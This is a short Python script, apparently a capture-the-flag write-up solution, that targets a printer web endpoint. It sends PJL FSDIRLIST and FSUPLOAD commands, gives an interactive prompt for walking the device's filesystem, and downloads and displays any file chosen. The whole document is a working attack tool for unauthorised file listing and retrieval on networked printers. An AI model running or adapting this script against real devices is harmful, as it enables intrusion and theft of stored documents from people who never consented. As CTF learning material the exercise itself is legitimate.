#!/usr/bin/env python3

import requests
from sys import argv
from bs4 import BeautifulSoup

if __name__ == "__main__":
    if len(argv) != 2:
        print("Usage: writup.py IP:PORT")

    URL = 'http://' + argv[1] + '/printer'
    PATH = '0:'
    while True:
        DATA = {'pjl': f'@PJL FSDIRLIST NAME="{PATH}"'}
        resp = requests.post(url=URL, data=DATA)
        soup = BeautifulSoup(resp.text, 'html.parser')
        result = [y.split(' ') for y in [x[1:] for x in str(soup.p.prettify()).split('\n')[3:-1:2]]]

        print('-' * 42)
        for k, *t in result:
            print(f"{'dir' if 'DIR' in t[0] else 'fil'} - {k}")

        entry = None
        while not entry:
            entry = input(f"{PATH}> ")
            if entry == 'exit':
                exit(0)
            elif entry not in list(zip(*result))[0]:
                entry = None

        typ = None
        for k, *t in result:
            if k == entry:
                typ = t[0]
                break
        
        if 'DIR' in typ:
            PATH += (('' if PATH[-1] == '/' else '/') + entry + '/')
        else:
            DATA = {'pjl': f'@PJL FSUPLOAD NAME="{PATH+entry}"'}
            resp = requests.post(url=URL, data=DATA)
            soup = BeautifulSoup(resp.text, 'html.parser')
            print('-' * 42)
            print(soup.p)
